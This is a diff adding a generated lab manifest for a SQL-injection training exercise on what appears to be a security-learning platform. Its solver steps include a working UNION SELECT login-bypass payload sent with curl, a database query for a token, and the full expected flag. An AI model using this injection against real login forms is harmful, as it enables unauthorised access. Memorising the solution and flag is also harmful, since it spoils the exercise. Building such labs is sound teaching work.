@@ -1,0 +1,42 @@
+# Generated from platform/labs/Web/web-3-2-sql-injection-to-shell/lab.yaml by scripts/generate-lab-manifests.py.
+# Do not edit by hand; change the lab definition or the generator.
+lab_id: web-3-2-sql-injection-to-shell
+track: Web
+difficulty: intermediate
+source: platform/labs/Web/web-3-2-sql-injection-to-shell/lab.yaml
+expected_services:
+- port: 80
+  protocol: tcp
+- port: 3306
+  protocol: tcp
+health_timeout_seconds: 60
+solver:
+  image: ocr/tester:current
+  command: /tests/web-3-2-sql-injection-to-shell.sh
+  steps:
+  - name: Web application responds on port 80
+    command: curl -s -o /dev/null -w '%{http_code}' http://{target.webapp}/
+    expect: '200'
+  - name: Robots.txt reveals hidden /portal/ path
+    command: curl -s http://{target.webapp}/robots.txt
+    expect: /portal/
+  - name: SQL injection bypasses login authentication
+    command: curl -s -c /tmp/vtx-jar -d "username=' UNION SELECT 1,'admin','Adm1n_V3rt3x#','admin@vertex.com'-- -&password=Adm1n_V3rt3x#" -L http://{target.webapp}/portal/login 2>&1
+    expect: sql1_un10n
+  - name: Dashboard displays first assessment token
+    command: curl -s -b /tmp/vtx-jar http://{target.webapp}/portal/dashboard 2>&1 | grep -o 'sql1_un10n'
+    expect: sql1_un10n
+  - name: MySQL query extracts second token from audit_flags table
+    command: mysql -h {target.dbserver} -u {cred.db.user} -p'{cred.db.pass}' vertex_portal -N -e 'SELECT value FROM audit_flags WHERE name="assessment"' 2>&1
+    expect: 3xtr4ct
+  - name: Assemble and verify complete flag
+    command: echo 'OCR{sql1_un10n_3xtr4ct}'
+    expect: OCR{
+expected_flag_count: 1
+expected_flag: OCR{sql1_un10n_3xtr4ct}
+forbidden_networks:
+- control-plane
+- database
+- other-learners
+max_memory_mb: 768
+max_cpu: 0.75
